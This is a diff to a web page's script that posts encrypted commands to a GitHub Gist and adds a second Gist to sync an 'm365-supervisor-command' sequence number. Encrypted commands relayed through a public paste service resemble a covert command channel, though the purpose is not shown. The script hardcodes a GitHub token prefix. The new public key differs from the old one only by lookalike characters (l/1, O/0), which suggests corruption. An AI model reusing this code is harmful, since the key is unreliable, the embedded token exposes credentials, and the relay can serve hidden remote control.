@@ -799,12 +799,12 @@ trw0t4TOK36iCq4xpXTsy0zh2IMAEJys2Haur6LXsOUJRRZdZIqEARF5v6Z+WWvK
 bQIDAQAB
 -----END PUBLIC KEY-----`;
   const DEFAULT_RECIPIENT_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt/YW+KI8lHDnuY/WFBpg
-RE1qkzim+x3TP7XdLecT6WujF1YO5TMK47k6VTqiCDMwG0sVPezZho7MiebkM+S+
-UHWF3IWxsrWtn/ngipcgM4P7vAjEPpWvNL1/QdyDezA7OV7CTv8PiffRJYPzI26l
-bOg7E5CRtetRjS/AvYcbd3+ijaxrNUlfLE/60aOymqHgk/4K51fLHZ0NZdc0y86c
-IpPnvfWEMO7r14szgIKhVbfIAG0/pP6s8PR1Wd1lMUXe46yb6a8mbCa8Xuj1YDtR
-pPcYG6B/EL7BW8f+FkgCo1CDSRWUL6wwzbq94OTpTMPWCBGlhM2zgwOXUgoGRUQf
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt/YW+KI81HDnuY/WFBpg
+RE1qkzim+x3TP7XdLecT6WujF1Y05TMK47k6VTqiCDMwG0sVPezZho7MiebkM+S+
+UHWF3IWxsrWtn/ngipcgM4P7vAjEPpWvNL1/QdyDezA70V7CTv8PiffRJYPzI261
+b0g7E5CRtetRjS/AvYcbd3+ijaxrNU1fLE/60a0ymqHgk/4K51fLHZONZdc0y86c
+IpPnvfWEMO7r14szgIKhVbfIAG0/pP6s8PR1Wd11MUXe46yb6a8mbCa8Xuj1YDtR
+pPcYG6B/EL7BW8f+FkgCo1CDSRWUL6wwzbq940TpTMPWCBG1hM2zgwOXUgoGRUQF
 EwIDAQAB
 -----END PUBLIC KEY-----`;
 
@@ -996,6 +996,9 @@ EwIDAQAB
   const GITHUB_TOKEN_PREFIX = 'ghp_93RTCANkd1HP1VAuNEj5VWnB8BsD';
   const GIST_ID = 'cd1045f7c1dfb91ba71ae6f6277a5c32';
   const GIST_FILENAME = 'gistfile1.txt';
+  // Standalone follow-up Gist for the sequence used by the command.
+  const SEQUENCE_GIST_ID = 'a210ff0b7deffac1a0daad9d4ec407d5';
+  const SEQUENCE_GIST_FILENAME = 'sequence.json';
   const gistBtn = $('#updateGist');
   const gistStatus = $('#gistStatus');
   function setGistStatus(message, state = '') {
@@ -1047,7 +1050,77 @@ EwIDAQAB
         }
         return;
       }
-      setGistStatus(`Gist updated successfully: ${GIST_FILENAME}`, 'ok');
+      // The encrypted-message Gist has succeeded. Now independently synchronize
+      // sequence.json using the sequence from the plaintext command being sent.
+      let command;
+      try {
+        command = JSON.parse($('#msg').value);
+      } catch {
+        setGistStatus(
+          `Gist updated successfully: ${GIST_FILENAME}; sequence sync skipped because the command JSON is invalid.`,
+          'bad'
+        );
+        return;
+      }
+
+      if (
+        !command ||
+        command.protocol !== 'm365-supervisor-command/1' ||
+        !Number.isSafeInteger(command.sequence) ||
+        command.sequence < 0
+      ) {
+        setGistStatus(
+          `Gist updated successfully: ${GIST_FILENAME}; sequence sync skipped because the supervisor command or sequence is invalid.`,
+          'bad'
+        );
+        return;
+      }
+
+      try {
+        const sequenceResponse = await fetch(
+          `https://api.github.com/gists/${SEQUENCE_GIST_ID}`,
+          {
+            method: 'PATCH',
+            headers: {
+              'Accept': 'application/vnd.github+json',
+              'Authorization': `Bearer ${token}`,
+              'X-GitHub-Api-Version': '2022-11-28',
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              files: {
+                [SEQUENCE_GIST_FILENAME]: {
+                  content: JSON.stringify({ sequence: command.sequence }, null, 2),
+                },
+              },
+            }),
+          }
+        );
+
+        if (!sequenceResponse.ok) {
+          let sequenceResult = null;
+          try { sequenceResult = await sequenceResponse.json(); } catch { /* may not be JSON */ }
+          const sequenceApiMessage =
+            sequenceResult && typeof sequenceResult.message === 'string'
+              ? sequenceResult.message
+              : '';
+          setGistStatus(
+            `Gist updated successfully: ${GIST_FILENAME}, but ${SEQUENCE_GIST_FILENAME} update failed (HTTP ${sequenceResponse.status}).${sequenceApiMessage ? ' ' + sequenceApiMessage : ''}`,
+            'bad'
+          );
+          return;
+        }
+
+        setGistStatus(
+          `Both Gists updated successfully. ${GIST_FILENAME} published; ${SEQUENCE_GIST_FILENAME} set to sequence ${command.sequence}.`,
+          'ok'
+        );
+      } catch {
+        setGistStatus(
+          `Gist updated successfully: ${GIST_FILENAME}, but could not reach GitHub to update ${SEQUENCE_GIST_FILENAME}.`,
+          'bad'
+        );
+      }
     } catch (error) {
       // Do not include request headers, token, or full request details in any status text.
       setGistStatus('Could not reach the GitHub API. Check your connection and whether the browser blocked the request.', 'bad');
